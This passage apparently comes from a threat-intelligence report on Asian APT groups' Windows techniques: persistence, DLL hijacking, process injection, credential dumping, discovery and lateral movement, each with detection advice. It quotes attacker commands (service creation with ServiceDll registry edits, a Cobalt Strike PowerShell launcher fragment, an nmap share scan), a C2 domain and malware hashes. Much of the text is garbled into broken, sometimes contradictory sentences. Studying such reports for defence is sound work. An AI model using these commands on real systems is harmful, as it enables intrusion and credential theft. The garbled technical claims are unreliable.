will be loaded into the . process .  System Process: Windows Service T1543.003.003 . While concealing their malicious services in the context of the svchost.exe process, they also added a new service name to fontcsvc and specified the ServiceDLL .  Service was created remotely by using the sc create command: Create or Modify System Process: Windows Service T1543.003 . The legitimate variant has 5 random characters at the end (for example, WpnUserService_562df), making it easier for an attacker to conceal a malicious service .  A BAT file is run with system privileges to create a service using the sc command . The service was created from a remote host, which is definitely suspicious . Another pattern observed among Asian APT groups is their tendency to delete and rewrite a service .  We encountered similar activity when analyzing an incident in Kyrgyzstan in which a BAT file was run on a host remotely using WMI . Here the attackers add a value defining actions to be taken in response to errors (FailureActions) However, just like in the previous example, they change the standard function ServiceMain to another function (CreateConfigStream)  \"Remote Desktop Configuration Manager\" reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\SessionEnvSvc\" /v \"ServiceDll\" - changing default name of ServiceMain net start \"SessionenvSVC\" \"AudioSrvSv\" is created by \"Windows Audio Manager\"  Although it is rather easy to track the creation of a new service, this activity is generated by most legitimate applications . Each organization must ensure thorough filtering of applications that are used in their organization . The primary way to detect this technique is to monitor any modifications made to the Services tree of the Windows registry .  Malicious software often creates Windows services to ensure proper functioning of the application . Malicious services typically have their executable files in shared directories . legitimate software is usually run from the Program Files directory . We are advised to track the creation of services via the command line, including the following events .  The Hijack Execution Flow technique allows an attacker to capture an execution thread and get their code to run in the context of a legitimate process . An attacker often gets this opportunity due to the specific features of operating system programs (for example, the system can independently find a DLL to attack).  MITRE ATT&CK framework distinguishes the following Hijack Execution Flow sub-techniques for Windows . These include DLL Search Order Hijacking, DLL Side-Loading and Services Registry Permissions Weakness . For example, application A.exe attempts to load the a.dll library from a directory, but this DLL is missing from the system .  This is known as Phantom DLL Hijacking in the security community . Windows DLL Redirection lets you redirect an execution thread to a legitimate DLL after code is executed from a loaded/malicious library . An application calls a specific function from the malicious DLL while “assuming” that the library is legitimate .  When creating a DLL, the actor indicates that it must export specific functions and redirect their execution to the original library . The add_numbers and ordinals_test functions in ProxyLib.dll are redirected to the identically named functions in SimpleLib_1.dll .  When attempting to load a specific library into the address space of a process, the Windows OS checks for it in the following directories: If an attacker has permissions to write to a directory located higher on the list than the directory containing the legitimate DLL, they can drop a malicious library into it . In this case, the attacker’s DLL will be loaded into the process . This technique is often accompanied by the use of DLL Redirection to avoid errors .  Asian APT group copied a malicious library to the directory %SystemRoot%\\System32\\oci.dll on a host and started the Distributed Transaction Coordinator service using sc.exe: IKEEXT . The library is not present in the standard distribution of Windows . This provides the opportunity for attackers with local administrator rights to create a malicious oci.dll .  The wlbsctrl.dll library is absent from the standard distribution of Windows OS . We presume that the attackers transferred a malicious DLL from a remote host so that they could implement DLL Search Order Hijacking . Actors do this by using Service Control Manager and the console-based utility for working with it (sc.exe)  DLL Hijacking can be difficult to manually detect, but you can use an EPP solution . You can also take several actions to help in the detection . A system profile is compiled by determining what is normal for a system and what is abnormal for the system .  The next step is to write correlation rules based on the data you obtained: a. Loading a DLL that is absent from the system (Phantom DLL Hijacking) Loading a standard DLL from a non-standard directory (DLL Side-Loading, Masquerading) Loading DLLs loaded by an executable file is also a vulnerability .  The security community frequently publishes data on newly detected applications that are vulnerable to DLL Hijacking . By monitoring this data, you can do the following: Write correlation rules to quickly detect a new procedure . Run the Threat Hunting process to confirm or disprove that a system was compromised using this procedure .  DLL Side- Loading is very popular among attackers because it lets them take advantage of DLL Search Order Hijacking and avoid dependencies on the particular software installed in the victim's infrastructure . The attack procedure is simple: Examples of procedures .  Asian APT groups use the DLL Side-loading technique very often . In an attack targeting an organization in Indonesia, attackers used an application called meupdate.exe . After the application was started, the malicious DLL was loaded into the address space of the meupdate process .  An Asian APT group used side-loading to load a malicious DLL into a legitimate process . Side-loading enabled the acrobroker.exe process to execute code in the context of a service. As a result, a malicious . DLL was loaded into a new process and initiated startup of netsh.exe. Then code was injected into this process .  Asian APT group used Side-loading for code execution that was less noticeable . After the code injection, the netsh.exe process connected to the attackers' administrative control console at \"www.zemelya67[.]ru\" to receive commands .  Other files: MD5 File name Verdict B13C355F6A5EDC9E 3067EC76D7CF04ED dbhelp.dll Trojan.Win32.APosT.nyb C19B5F9BF1CD6BC5 C9F9EE554B0C2665 mpclient.c B65F28835D13F17E D7EAC5EEB0D4C662 C:\\Users\\User\\User/AppData\\Local\\cef\\ cryptbase.dll Backdoor.MysterySnail.c c:\\Program Files\\nvidia corporation\\ nvstreamsrv\\steamlauncher\\ supporttool\\  Side-loading technique allows attackers to load libraries loaded into legitimate processes . This helps attackers avoid detection and maintain access to the infrastructure . When indicators are deleted, it becomes extremely difficult if not impossible for security experts to detect and investigate an infection .  Malware and tools may leave entries in event logs or in temporary files that indicate suspicious behavior on the network or directly on the victim's machine . These files are often deleted for the purpose of covering the tracks of attackers in the system. to the infected system .  Indicator Removal: File Deletion T1070.004 technique is to look for process creation events that you can use to detect suspicious command-line arguments such as \"del\" in Windows . Impacket modules also delete scripts after a command is executed: %COMSPEC% /Q /c echo <command> ^> .  Sysmon monitoring agent can be configured to log events for the deletion of only executable files to reduce the volume of logs . EDR solutions also monitor file deletion events . Detection rules can be created based on creation and deletion events over a specific time interval .  Asian APT groups often utilize the Process Injection technique, especially Process Hollowing . The main way to detect the technique is to look for process creation events that have suspicious command-line arguments such as \"net use \\\\system\\share /delete\"  In some cases, attackers attempt to execute their code by directly querying the address space of the target process and writing commands to it . This activity can be detected by analyzing the sequence of WinAPI functions that are used . To continue the attack, the attacker needs permissions to write to the address . This means that they need at least the following permissions: PROCESS_VM_WRITE, PROCESS .  The WinAPI VirtualAllocEx is used to allocate memory in the address space of the target process . The next step of the attacker is to write a string containing the file system path to the DLL that the attacker wants to load into the process .  The attacker creates a thread in the target process by calling the CreateRemoteThread function . The address of functions implemented in kernel32.dll normally remains the same in different user processes . The attacker passes the address of the LoadLibrary function that was obtained at step 4 .  The attacker uses this attribute to pass the address of the memory area allocated at step 2 . This memory area contains a string with the path of the loaded DLL in the file system . Completion of this step results in generating Sysmon Event 8 (CreateRemoteThread) which will show the attributes listed above .  Watch out for situations in which the access token of the attacker's process has the SeDebugPrivilege in the enabled state . This way, the Process Injection technique can also help elevate privileges in the system . When UAC is enabled, the Se DebugPrivilege can reside only in a token whose Integrity Level is High or better .  Event 7 (Image Loaded) and Event 8 (CreateRemoteThread) can be used to create correlation rules . The most popular way to implement Process Injection among Asian APT groups is Process Hollowing . This type of code injection relies on the capability to create a process in the suspended state .  Security solutions often scan the executable file of a process before the process is started . This means that they have already concluded whether a process is \"harmless\" or not before it is created . This helps attackers remain undetected for a longer period of time .  The Native API function NtUnmapViewOfSection is normally used for this purpose . The arguments passed to this function include the handle of the process intended for unmapping and the address of the original . file image . memory is allocated for the new . executable file in the target process .  Asian APT groups regularly use the Process Hollowing technique . C:\\Windows\\System32\\svchost. exe is often the process image that they run . The attacker resumes thread execution, often by using the ResumeThread API function. and SetThreadContext .  APT groups predominantly choose legitimate processes as their target processes . This event often occurs when browsers are running, which should be taken into consideration when writing correlation rules . You can distinguish and detect certain patterns, and thereby significantly reduce the attack surface for attackers .  A disruption of \"normal\" behavior can be viewed as potentially malicious activity . Some company- specific software or environments may result in false positives . The detection logic can be expanded by writing detection rules for anomalous behavior related to other processes in addition to svchost.exe .  Asian APT groups often attempt to disable specific security solutions that hinder their intended malicious activity . To disable security measures, APT . groups use various means such . tools specially created for this purpose, registry changes, . PowerShell, LOLBAS, and others . Attackers also often use legitimate and signed vulnerable drivers to disable protection mechanisms from kernel mode .  An Asian APT group used PowerShell to disable the real-time monitoring option in Windows Defender . The attackers used Windows Defender to add their malicious files to Windows Defender exclusions: Technical details | Defense Evasion TA0005 | Impair Defenses: Disable or Modify Tools T1562.001 .  Procedures that exploit vulnerable drivers are difficult to detect . Look for driver loading events that contain a driver file hash . If a driver hash is on the list of vulnerable drivers that are exploited by attackers, you must investigate the origin of that file . Another detection approach is to look for events involving process creation and execution of PowerShell script blocks .  APT actors use various methods to obfuscate the contents of their malicious files . They can encrypt or compress them, obfuscate their code, rename variables or functions to conceal their purpose . When executing commands in the Windows command line or PowerShell, attackers often try to conceal the execution of malicious commands .  Attackers often use Base64 for obfuscation . Hackers decode their Base64-encoded command line while executing a command by using the \"-EncodedCommand\" parameter or the FromBase64String method . This method consists of breaking up PowerShell commands into multiple strings that will not set off alerts .  The APT group in Pakistan used custom-written PowerShell scripts for data exfiltration . The contents of the first script were also encoded into one Base64 string and were saved to a file in a temporary directory . The second script was encoded in Base64 and decoded and executed by the first .  In an attack targeting Indonesia, we observed the following example of obfuscation . The executable file used for the service was cmd.exe with parameters for running a script in PowerShell . This script contained Cobalt Strike in the form of binary (shell) code with a size of ~100 bytes .  \"C:\\Windows\\system32\\cmd.exe -nop -w hidden -noni -c \"if [IntPtr]::Size -eq 4(){$b=$env:windir+ '\\sysnative\\WindowsPowerShell\\v1.0\\PowerShell.exe' $s=New- Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b; $s.UseShellExecute=$false;$p=[System.Diagostics.process]::Start($s);\"  Several methods are employed to detect obfuscation . One way is to determine the entropy value, which is a measure of data uncertainty . When data compression or encryption algorithms are applied, the frequencies of occurrence of bytes are redistributed and entropy increases . Some obfuscation methods can be detected based on patterns in the command line .  Microsoft-Windows-PowerShell/Operational 4103, 4104 Sysmon 1 Technical details | Defense Evasion TA0005 | Obfuscated Files or Information T1027 PowerShell is a very powerful tool that enables attackers to modify the appearance of the command line used to start a process .  Masquerading T1036 is one of the methods used by Asian APT groups to conceal their activity and bypass various security mechanisms . It involves the use of legitimate processes, files, or commands to disguise malicious activity as normal operations . An attacker may resort to using already familiar names of processes in the operating system .  Asian APT groups dropped their executable files during an attack . The following directories (sorted by popularity) are encountered in the overwhelming majority of cases . C:\\Windows\\Temp, C:\\windows\\Temp and C:\\tasks are the most frequently used directories . We recommend paying close attention to these directories .  Asian APT groups often prefer to masquerade as various IT security products . A frequently used type of masquerading is to mimic legitimate operating system processes for the purpose of obstructing efforts by cybersecurity experts to analyze the system . This behavior is primarily observed when they implement the techniques known as Hijack Execution Flow: DLL Side-Loading .  The attacker delivers a malicious library and legitimate software to intercept a thread and run their own code in the context of a legitimate process . Then a process is created with a legitimate name, the executable file in the address space of the process is replaced, and the real malicious activity begins . This activity can be detected by identifying anomalies in parent and child processes in Windows .  Russia. Russia. It was named C:\\ProgramFiles\\CommonFiles\\services\\avg\\CRYPTBASE.dll (MD5:AC40DD84292A7F594AD7A7DD20631D78)  APT actors may disguise themselves as legitimate processes for malicious purposes . Anomalies can be detected in process trees (non-standard child and parent processes) Asian APT groups may also use simpler methods . For example: C:\\ProgramData\\svchost.exe Start with no Standard parameters .  WebDav-O malware at the path C:\\windows\\system32\\conhost64.exe is a fake name, and the real name is C:\\Windows/system32/conhost.exe . In a campaign targeting a government institution in the Pacific region, an attacker used an archiver disguised with the name of the .svchost .  In January of 2022, Kaspersky ICS CERT experts detected a wave of targeted attacks against companies of the military-industrial complex and government institutions in several countries of Eastern Europe and in Afghanistan 12.005. (MD5: D263D26A2BE8D971273F6C9FA2EC6608)  Malicoius file disguised as Kaspersky Anti-Virus . Malicious file named GoogleUpdate created an administrative account on the local machine . In this incident, we also detected a malicious file called GoogleUpdate, which created a malicious account .  The main way to detect this subtechnique is to monitor the startup of processes and creation of files that are named as standard system files but are located in non-standard directories . Attackers primarily try to disguise themselves as files located in the following directories: • System32 • SysWOW64 • WinSxS 170 Contents Modern Asian APT Groups: Tactics, Techniques and Procedures .  Asian APT groups disguise services in their operations to avoid detection and evade security mechanisms . They may modify the name or path of an executable file, command-line parameters, or other properties related to a process or service . As described above, Dark Seoul used this technique to disguise its services as legitimate one .  A running library created a service with the same name as the Windows Push Notification User Service . Based on KTAE, this sample is attributed to the MATA family with a 96% probability . MATA is a malicious framework for network equipment running Windows and Linux that has been used in a wide range of activity since 2018 .  It is difficult to detect the use of this technique because the attacker constantly invents new names and descriptions for their malicious tasks and services . We recommend that you monitor the creation and startup of services that have parts of legitimate names but are not from their original processes . For example, a service that is created with the description \"google\" and comes from a process other than \"$programfiles\"  In the description of their service, attackers often warn that their supposedly \"critical\" service should not be stopped or disabled because this would disrupt an important component in the system . You can use this trend to build a correlation rule that tracks the keywords \"if\", \"stop\", and \"disable\" in service descriptions .  OS Credential Dumping: LSASS Memory T1003.001 is used by attackers to obtain credentials in a Windows OS . These credentials are normally in the form of a password hash or cleartext password . The obtained credentials can then be used for lateral movement and access to restricted information .  Asian APT groups often use Mimikatz, ProcDump and LaZagne tools to gain privileged access to the system or to extend their attacks to other resources on the network . The most popular tools employed by attackers are the following: Mimikat, Procdump, Rubeus, Seth, PowerSploit, secretsdump.py and lsassy .  Mimikatz is very popular among attackers, including Asian APT groups . In some attacks, one of the other ways they used to gain access to lsass.exe memory was using an SSP provider . The LoLBin tool was renamed to C:\\Windows\\System32\\comsvcs.dll .  Asian threat actors use many variations of custom-written tools as well as popular tools such as Mimikatz . One method to obtain a memory dump of lsass.exe that was observed in the Indonesian incident is to steal the handle of the process . Another method is to get access to the address space of this process .  OS Credential Dumping: LSASS Memory T1003.001 can be detected by tracking unsigned libraries being loaded into the lsass.exe process . Use antivirus software and other tools to detect malicious programs such as Mimikatz, ProcDump, and others that may be used to gather account credentials from LSASS memory .  The lsass.exe process, read/write permissions are required . For example, the following regular expression includes all possible combinations of rights with read or write access: PROCESS_VM_READ (0x00000010) PROCESS .VM_WRITE (1) ^0x\\w*[1235679abdef]\\w$  Process Created events can be used to detect the following anomalies: Loading a DLL from a shared directory into the lsass.exe process . You can additionally track the creation of a remote thread in the . lsass .exe process (Remote Thread Created) from a non-standard process .  OS Credential Dumping: Security Account Manager T1003.002 is also used by attackers to get account credentials . This subtechnique involves extracting account credentials from the SAM database in Windows operating systems . SAM contains information on users and user groups, stores user password hashes, and is required for login authentication .  Most Asian APT groups that we observed implement this technique by using the standard reg.exe tool and saving registry hives to shared directories in the operating system . The group known as CopperTurtle frequently saves the hives in the Recycle Bin and archive them .  Account Manager T1003.002: Track situations in which the reg.exe command is started to save the SAM, SYSTEM, and SECURITY registry hives . The second method is to monitor all queries to these registry . Object access events occur frequently . An EDR solution and the standard Windows audit (Event ID 4663) normally tracks specific critical-access objects .  NTDS.dit is the main Windows Active Directory database that contains information about users, groups, computers, and other objects in a network domain environment . Database files, transaction logs, and checkpoint files are usually stored in the C:\\Windows\\NTDS directory on all domain controllers .  As soon as the attacker gains access to the file system of the domain controller, they can save the NTDS. dit file and the HKEY_LOCAL_MACHINE\\SYSTEM, registry hive, which contains the boot key . Keep in mind that Active Directory maintains a lock on the . file, thereby preventing direct copying of this file .  Asian APT groups have been observed using this utility in a multitude of campaigns . The ntdsutil.exe utility is a console utility for working with an AD database (ntds.dit) It lets you create IFM for DCPromo .  NTDSUTIL can be used to extract NTDS.dit locally on a DC by creating an IFM (shadow copy of VSS) An EDR solution can also track calls of API functions used to shadow copy sensitive files . NTDSDumpEx utility extracts data from a saved ntds.dit .  Unsecured Credentials T1552 includes methods used by attackers to detect and obtain system account credentials that are unprotected or stored insecurely . This technique is used in scenarios when passwords, API keys, certificates, or other account credentials are stored or transmitted in an unsecured or unreliable format or location .  Threat actors use files stored in unsecured or poorly protected format to collect confidential information . This technique relies on the fact that people and companies often store account credentials in various files, including configuration files, scripts, logs, and other types of documentation . These files may be inadvertently left accessible to unauthorized users .  Attackers most frequently attempt to find a local administrator password assigned in a GPO . The SYSVOL folder may store scripts for use in a domain infrastructure . We noticed commands used to search for unsecured account credentials in the SYSvol folder .  You can detect this technique by looking for process creation events . In the command line, you can look for signs of a template search . You must configure an object access audit for these decoy files . Any processes that attempt to access these files must be inspected for malicious activity .  APT groups try to access common places used to store passwords . Passwords are stored in multiple locations in the operating system, including in third-party applications such as browsers or password managers . After obtaining credentials, attackers can use them for lateral movement and to access restricted information .  Users often let browsers save domain passwords that are used to access internal services via ADFS . Here are some locations where popular browsers store files containing sensitive data: Google Chrome $user\\$appdata\\Google\\Chrome\\User Data\\.*\\Bookmarks $user;$app data: $user: Chrome; Firefox; Opera; . Users often save the domain passwords in a domain infrastructure .  APT Groups: Tactics, Techniques and Procedures . Credential Access TA0006 | Credentials from Password Stores: Credentially from Web Browsers T1555.003 Examples of procedures . In the incident in Malaysia, we detected a sample that gathers account credentials from a browser .  The attackers brought their own legitimate file and malicious library . When they ran the legitimate file, the malicious library was loaded and executed . The following log files were created: ingame_64.exe . The primary way to detect the technique is to track attempts by non-standard processes (other than legitimate ones)  Reconnaissance of specific software in a company may provide valuable information to attackers . Software can be analyzed to identify vulnerabilities that the attackers can exploit . Attackers may masquerade as legitimate company software to conceal their malicious activity . Some APT groups avoid attacking systems to minimize detection by security products .  Information about installed software can be gathered in different ways . APT groups used the dir command to display a list of files in a directory . Operators also used the wmic utility to get a list . of installed software . that have code writing applications, SysInternals monitoring programs, or programs used to analyze malware and network traffic .  Use of the Wmic console utility and the Reg.exe utility to query the installed software in the Windows registry . Detection detection rules can be generated based on the command lines in the examples presented above . This may include the Dir command for enumerating directories in C:\\Program Files .  Detection of this technique is complicated by the fact that all of these actions can also be performed for legitimate purposes . To reduce the likelihood of false positives, you are advised to employ multiple rules that are aimed at detecting various Discovery techniques . For each organization, you must clarify and exclude certain activity by profiling the legitimate activity that occurs in the particular organization .  Windows OS services are used by attackers for various objectives . Attackers use the System Service Discovery technique to view the running services and to search for information about a specific service . WMI can be used with standard tools as well as with WMI, so examples of its use are also presented in the tables .  Asian APT groups often conduct a pinpoint inspection of services . They do this because of their frequent use of the DLL Hijacking technique . To conduct reconnaissance of services by using the registry, attackers can view the contents of the HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services tree .  Asian APT groups use standard tools in operating system to find services that are vulnerable to this type of attack . Some of the more sophisticated Asian APTs groups also combine service discovery methods like in this example of an attack targeting an industrial facility: $system32\\cmd.exe /C tasklist /svc | findstr lsass cscript.vbs /cmd 10.0.10 [domain]\\[user] [password] \"sc query wam\"  If an attacker conducts discovery of services by using the registry, this can be detected by looking for process creation events (EventId 4688 or Sysmon 1) Detection of this technique is complicated by the fact that most of these actions can also be performed for legitimate purposes by an administrator or other authorized person .  Attackers use this technique to gather information about the target system or network . This information can include the hostname, operating system version, open ports, running services, installed software, and installed software . in a temporary directory: dir \\\\<ip>$\\c$\\windows\\system32\\tasks .  The collected information is used to understand the context of the environment and to plan further attack vectors . Attackers also use the hostname command to get the name of the victim's machine . An executable file observed in one attack executes discovery commands .  The main way to detect the System Information Discovery T1082 technique is to look for process creation events, which can be used to identify suspicious command-line parameters . Detection of this technique is complicated by the fact that all of these actions can be performed for legitimate purposes by an administrator or other authorized person .  System Network Configuration Discovery is employed during the attack stage in which the attackers gather information about network settings and parameters . The collected data can be used by the attackers for communication . For each organization, you must clarify and exclude certain activity by profiling the legitimate activity that occurs in the particular organization .  There are many ways to get information about the network configuration in Windows . Outside of an attack, these actions are frequently performed by administrators/engineers for network configuration and troubleshooting . Some samples from Asian APT groups also contact online services to get a public IP address .  The specific number of rules and the applicable time period for a triggered alert should be appropriately configured based on the typical activity in the infrastructure . To reduce the number of false positives, you can combine multiple rules to trigger an alert . You can configure an alert to be generated when three discovery rules are triggered within a period of 10 minutes .  Asian APT groups frequently use the System Network Connections Discovery technique . To gather information about active sessions, attackers use the qwinsta command (the same as a query session) WMI is used to start these utilities on remote hosts .  Asian APT group used netstat after persisting in the system by service creation with the executable file named c:\\programdata\\usoshared\\hpnotifications.exe: Technical details | Discovery TA0007 | System Network Connections Discovery T1049 netstat -nato $system32\\cmd.exe .  This technique is difficult to detect because its typical actions may be legitimately performed by administrators and/or users . Due to the large amount of legitimate activity matching this technique, you can link multiple granular, time-based correlation rules to effectively identify malicious activity . For example, if there are multiple discovery rules, an alert can be generated when at least three of the rules are triggered on one host within a span of 10 minutes .  System Time Discovery is employed by attackers together with other techniques during the reconnaissance stage . The system time helps identify the victim's time zone, which also helps provide an approximate location . Asian APT groups often pursue specific objectives and victims, and the location of a particular system helps identify useful targets .  Asian APT groups often use specially prepared scripts in which they combine all of the main discovery commands necessary for conducting an attack . This technique can be detected by tracking commands that determine the system time . These commands may also be run during legitimate activity .  Attackers explore lists of groups, such as local groups, domain groups, and groups of cloud services . They analyze the permissions of these groups to identify accessible user accounts and user groups . This data allows attackers to get additional information about the compromised system that will be used for further actions .  An attacker infiltrates a host and obtains the capability to execute commands . They can identify members of groups in a Windows OS by using the dsquery utility . Or they can use the net utility: $system32\\cmd.exe /C net group /do .  Asian APT Groups: Tactics, Techniques and Procedures Detection . This technique can be detected by looking at process creation events, analyzing data from network traffic if domain groups are queried . Lateral movement of attackers through the network is usually preceded by searches .  A network shared folder is a shared resource for computers that are joined into one network . This allows users to access file directories in various systems over the network . Shared use of files on a Windows network is provided via the SMB protocol . For threat actors, this is another vector for lateral movement and another data collection resource .  Use of nmap to search for network resources: $system32\\cmd.exe /C net view \\\\remotesystem cmd.exe . Use nmap -p 445,3389 -T3 -v -n -Pn --open --script smb-enum-shares <xxx>.xml .  Smbscan.exe scans an IP address for network folders and prints the IP address to stdout if a response is received . The sample sends ordinary SMB packets (without shellcodes) and does not exploit SMB vulnerabilities . To detect the Network Share Discovery technique, you should track any startup parameters of the created processes .  APT actors can obtain additional information about a computer based on its IP address, name, or other network identifier . These capabilities are provided by remote administration tools (RAT) and by other tools available in the operating system . They can also get information about external hosts by analyzing the local ARP cache .  The Remote System Discovery T1018 technique is to look for process creation events . You should pay close attention to any running utilities or tools that were mentioned above, and analyze the command-line . This plug-in is a comprehensive scanner capable of scanning ports and identifying services, network assets, passwords and vulnerabilities .  Domain Trusts (domain trust relationships) are used in Microsoft Active Directory to identify the level of access between various domains . Trust Validation in the context of Active Directory refers to the process of verifying trust relationships between domains or forests . You can also utilize the capabilities of network traffic analysis (NTA) systems .  Main objectives of domain trust discovery: Search for trust relationships between various domains on a network to understand the domain structure and find opportunities to expand access capabilities . Discovery of trust relationships in a domain infrastructure can also be performed by using the following command: Technical . There are several tools for discovering trust relationships and detecting vulnerabilities in a Windows Active Directory network .  The nltest command can be used to identify trust relationships between various domains . The dsquery command lets you query Active Directory . It can help identify other domains with which the current domain has trust relationships . For example, you can use the following command to enumerate the trust relationships for a specific domain .  Get-ADTrust is a pentesting tool and should be used only with the approval of the system owner . PowerSploit tool has the Get-NetDomainTrust command, which provides information about trust relationships between domains . This tool can be used by attackers to inspect a network .  The Get-NetForestDomain command from the PowerSploit toolset can be used to display information about trust relationships within a forest . In the attack targeting Russian companies, the following commands were used: Detection It may be difficult to detect the Domain Trust Discovery .  Attackers can use various methods and tools to explore the trust relationships in a Windows Active Directory network . Attempts to detect domain trust relationships usually involve tracking specific commands or scripts . You can also monitor Active Directory events involving changes made to trust relationships between domains .  Attackers gather information about a system by querying the registry . The Windows registry contains a large amount of data on the computer configuration and users . In many cases, this is not the primary technique that the attackers use for their ultimate objectives . In this case, the Query Registry technique only shows how the attackers achieve certain objectives .  an Asian APT group gathered information about storage devices connected to a host by using the following registry queries: reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR . The group gathered about installed office software from the registry .  A request for information from the registry is not necessarily an indicator of an attack or malicious activity . Detection of this technique should rely on non-typical patterns of process creation (for example, multiple reg.exe processes created by cmd.exe with queries to registry keys containing information about data storage devices)  In Windows, you can view local and domain users by using PowerShell . The primary tool used for account discovery is net.exe (or net1.exe) This data can be then used to more effectively search for account credentials (Credential Access) and/or carry out other stages of an attack .  Asian APT group used the net.exe utility to gather information about local accounts . In one example, attackers used the .NET utility to get a list of accounts in a cloud-based . Active Directory: net user <xxx> net user Get-MsolUser .  Account Discovery technique can be detected by tracking process creation events and script execution events (PowerShell: 4103, 4104) Keeps mind that viewing the users in a system is a legitimate activity . You can also track LDAP requests to enumerate users in an LDAP domain .  The File and Directory Discovery T1083 technique involves searching and analyzing files and directories on a host . Threat actors use this technique to get information about the environment of the target system, identify valuable data, or find vulnerabilities in the system for further exploitation .  This technique is most frequently combined with other techniques such as T1552 (Unsecured Credentials), T1119 (Automated Collection), and most techniques from the TA0007 (Discovery) tactic aided by ready-to-use scripts or tools .  Group policies are used for centralized configuration of endpoints in a domain . A large variety of settings can be configured through group policies, ranging from the user desktop wallpaper to scripts that are run when the user logs in . Attackers aim to get relevant information about a domain, including information about group policies .  Asian APT group directly read the contents of script files and group policy files by using cmd.exe . You can detect this technique by looking for process creation events and script block execution events . The typical patterns of group policy discovery in . PowerShell are specified in the SIGMA rule .  To reduce the number of false positives, you should carefully analyze the environment to determine what specifically occurred on the host when these commands were executed, which user account was used to run them, and whether or not Security Operations department was informed about administrative or other legitimate operations being performed .  APT actors often analyze a network to find vulnerable services . One of the ways to implement this technique is to view open ports on the local/remote host or network device . Asian APT groups also use utilities such as port scanner (MD5 bb2ee5e6dfdd4d12d31ec33c3fba84909).  The technique known as Network Service Discovery T1046 can be detected by tracking process creation events . The technique was detected in the following directories: С:\\Users\\Public\\Downloads\\ and C:\\Windows\\tasks . You should pay close attention to any running utilities or tools that were mentioned above, and analyze the command-line contents .  The Process Discovery T1057 technique can be detected based on process creation events and process creation . In Windows operating systems, you can get information about running processes by using the tasklist utility in the command shell . The ps command is used in UNIX operating systems and the \"show process\" command can be used on network devices .  Process Discovery T1057 239 Contents Modern Asian APT Groups: Tactics, Techniques and Procedures . Attackers can determine the name of an authorized user of the system, and get a list of all users . This information is necessary for collecting additional discovery data .  In Linux and MacOS, the currently logged-in user can be identified by using the “w” and “who” commands . In macOS, the command “dscl . list /Users | grep -v '_' can also be used to enumerate user accounts . To access this information, you can also use environment variables such as %USERNAME% and $USER .  One of the ways to detect the System Owner/User Discovery T1033 technique is to track process creation events and the execution of PowerShell script blocks . You should pay close attention to any running utilities or tools mentioned above, and analyze the command-line contents (with audit enabled)  The Remote Services T1021 technique exploits a large number of remote connection services that attackers use to move through the victim's network . APT groups often use the SMB protocol to interact with shared file folders, which enables attackers to move deeper into the network . SMB (Server Message Block) is a network protocol intended for access to files and printers .  Asian APT groups use SMB/RPC to create Windows services, scheduled tasks, and WMI tasks . Files that are then run on the target system . To create a task on a remote host, the hostname is passed as an argument with the /s parameter .  The WMIC utility was used in the incident involving WebDav-O . Asian APT groups also use the popular tool known as PsExec . We also observed the APT group Dark Seoul using the SMBExec module from the Impacket framework .  A script on the attacker's machine uses SMB to download the temporary file containing the command execution results and displays its contents on the screen . This procedure essentially runs a shell that the attacker can use to execute commands without actually having the executable file in the system . Each time the command is executed, a new service is created .  In addition to using the utilities listed above, attackers also mounted shares using the net.exe utility . To detect lateral movement through the network, you need to track interactions with shared network folders, remote login events, and unusual connections over SMB .  Modern Asian APT Groups: Tactics, Techniques and Procedures Lateral Tool Transfer T1570 . After establishing persistence on a host, attackers transfer utilities, scripts, malicious software or other files between hosts in the infrastructure as part of their lateral movement within the network . Attackers use file transfer protocols such as SMB or RDP .  The attacker activity examined above can be detected based on process creation events . Some EDR solutions provide the capability to track events involving file creation via SMB . This may not be enough if the computer that initiated the file transfer is not connected to the monitoring system and no logs are received from it .  APT groups look for ways to spread malware through removable drives . By copying malware to removable drives and using autorun functions, attackers can run programs on a system where an infected drive is infected . To detect this technique, you can track the execution of utilities and commands that could be used to transfer files from one host to another .  ICS CERT team detected second-stage implants intended for collecting data from isolated systems . The primary module of the detected malware was intended for working with removable drives . The behavior of the module is configured using a configuration file dropped onto the host .  On each removable drive, the implant creates a hidden folder named $RECYCLE.BIN in the root directory of the drive and an empty file named S-1-5-21-963258 in the hidden folder . This file marks the drive as infected . When the user clicks the decoy LNK file, the McVsoCfg.dll implant is executed .  The implant infects the host, then attempts to delete itself from the infected drive . Immediately after that, a third-stage implant is extracted from memory, saved to %APPDATA% folder . The msgui.exe file is intended for collecting data and saving its results to the $RECYCLE.BIN folder .  Asian APT groups deliver utilities and malware to targeted hosts via shared network resources such as a read- accessible network folder . Asian threat actors often drop into the SYSVOL folder their files, which may include archives whose files are then copied to the file system . The following arguments are passed to the BAT script .  The technique can be detected based on the profile of the activities within the particular company . It can be used to detect GPOs and legitimate scripts that are shared in the domain controller shared folder SYSvol: Technical details | Lateral Movement TA0008 | Taint Shared Content .  The Pass-the-Hash technique enables attackers to move through a network by using the NTLM protocol without having an actual user password . Asian APT groups receive these hashes during the Credential Access stage . For example, they get them from the address space of the lsass.exe process or from the registry .  Lateral Movement TA0008 | Pass the Hash T1550.002 . We observed their implementation of the Pass-The-Hash technique after they successfully dumped password hashes from the lsass.exe process . The attackers most frequently used PsExec for a connection on the remote host .  Pass-the-Hash technique is difficult to guarantee unequivocal detection using standard tools . There are some effective approaches that can detect anomalies in user behavior and system interactions . You can also track NTLM connections in network traffic . In a company that has completely migrated to the Kerberos protocol, this may indicate a Pass- the-Hash attack .  Asian APT groups used a variety of archivers to compress data that was collected from various hosts . The attackers employed this technique before data exfiltration so that they could quickly transfer this data to their C2 server . This technique is also convenient because the required software is often already available on the machines of victims .  Attackers use various data encryption and compression tools that are available in the operating system . They deliver their own tools to infected machines for later use . We identified the top archivers that were used by Asian APT groups in incidents that we detected: Winrar • 7-ZIP • WinZip .  Asian APT groups often use 7zip utility to create archives . Asian threat actors often use the makecab utility in attacks against Russian companies . We observe similar procedures in attacks launched by APT . groups against Russian . companies: In one incident in Russia, we observed the use of the makeCab utility .  Attackers dump registry keys containing user account credentials . Then they pack them into ZIP archives using the makecab utility . Attackers also use their own custom-written tools that duplicate the functionality of well-known archivers. to create and manage compressed archives in Cabinet (CAB) format .  You can detect this technique by tracking process creation events (Event ID 4688 in Windows and Event ID 1 in Sysmon) and execution of PowerShell script blocks . Pay attention to the Image field in process creation and look for popular archivers and/or tools such as makecab designed to work with specific file formats .  After gaining access to a system or network, attackers can use automated data collection methods . Procedures used 